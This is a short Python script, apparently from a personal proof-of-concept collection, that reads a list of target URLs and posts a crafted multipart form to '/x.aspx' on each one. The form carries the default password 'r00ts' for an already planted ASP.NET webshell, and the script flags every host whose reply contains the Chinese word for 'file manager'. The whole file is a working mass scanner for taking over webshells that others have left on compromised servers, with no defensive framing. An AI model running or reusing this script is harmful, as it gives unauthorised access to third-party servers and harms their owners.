import requests
from common.open_target_file import *
def title():
    print('+------------------------------------------')
    print('r00ts文件上传wehshell默认口令')
    print('+------------------------------------------')

def poc(target_url):
    target_url = target_url + "/x.aspx"
    headers = {
        'User-Agent':'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:95.0) Gecko/20100101 Firefox/95.0',
        'Content-Type':'multipart/form-data; boundary=---------------------------3429808880227191546549501135',
    }
    payload = """
Content-Disposition: form-data; name="__EVENTTARGET"

Content-Disposition: form-data; name="__FILE"

-----------------------------3429808880227191546549501135
Content-Disposition: form-data; name="__VIEWSTATE"

/wEPDwUIMTA2MDIyMDAPZBYCAgQPFgIeB2VuY3R5cGUFE211bHRpcGFydC9mb3JtLWRhdGEWAgIDDxYCHgdWaXNpYmxlaBYWAgEPZBYEAgEPFgIeCWlubmVyaHRtbAUiMTkyLjE2OC4xMC4xMDA6ODA4OCgyMjIuNzYuNzQuMjMzKWQCAw8WAh8CBR5GcmFtZXdvcmsgVmVyIDogMi4wLjUwNzI3LjM2NjJkAgUPFgIfAgUg5paH5Lu2566h55CG5ZmoICZndDsmZ3Q7Jmd0OyZndDtkAgcPFgIfAWcWCAIBDxYCHgV2YWx1ZQUYRDpc5rW35Y2a6L2v5Lu2XFdFQl9QSUNcZAILDxYCHgdvbkNsaWNrBXB2YXIgZmlsZW5hbWU9cHJvbXB0KCdQbGVhc2UgaW5wdXQgdGhlIGRpcmVjdG9yeSBuYW1lOicsJycpO2lmKGZpbGVuYW1lKXtCaW5fUG9zdEJhY2soJ0Jpbl9DcmVhdGVkaXInLGZpbGVuYW1lKTt9ZAINDxYCHwQFbHZhciBmaWxlbmFtZT1wcm9tcHQoJ1BsZWFzZSBpbnB1dCB0aGUgZmlsZSBuYW1lOicsJycpO2lmKGZpbGVuYW1lKXtCaW5fUG9zdEJhY2soJ0Jpbl9DcmVhdGVmaWxlJyxmaWxlbmFtZSk7fWQCEA8WAh8EBTlpZihjb25maXJtKCfnoa7lrpropoHoh6rmnYA/Jykpe0Jpbl9Qb3N0QmFjaygnaGFlJywnJyk7fTtkAgkPFgIfAWgWAgIDDxBkZBYBZmQCEQ8WAh8BaGQCGQ8WAh8BaGQCGw8WAh8BaGQCHQ8WAh8BaGQCHw8WAh8BaBYEAgIPEGRkFgFmZAIFD2QWBAIDD2QWBAIBDxBkZBYAZAIDDxBkZBYBZmQCCQ88KwALAGQCIQ8WAh8BaGQCIw8WAh8BaBYCAgsPEGRkFgECAWRk
-----------------------------3429808880227191546549501135
Content-Disposition: form-data; name="__EVENTVALIDATION"

/wEWAwLngMyzDgLw1oCbAQKzounhCQ==
-----------------------------3429808880227191546549501135
Content-Disposition: form-data; name="HRJ"

r00ts
-----------------------------3429808880227191546549501135
Content-Disposition: form-data; name="ZSnXu"

----------OK! Let's Go.
-----------------------------3429808880227191546549501135--"""

    try:
        res =  requests.post(target_url,data=payload,headers=headers,timeout=5)
        if res.status_code == 200 and "文件管理器" in res.text:
            print(target_url)
            bingo.append(target_url)
    except requests.RequestException as e: #e为异常信息
        print ("请求异常：%s" %(target_url))

if __name__ == '__main__':
    target_path = "D://git/poccc/targets/r00ts.txt"
    url_list = open_url(target_path)
    bingo = []

    for url in url_list:
        poc(url)

    print(bingo)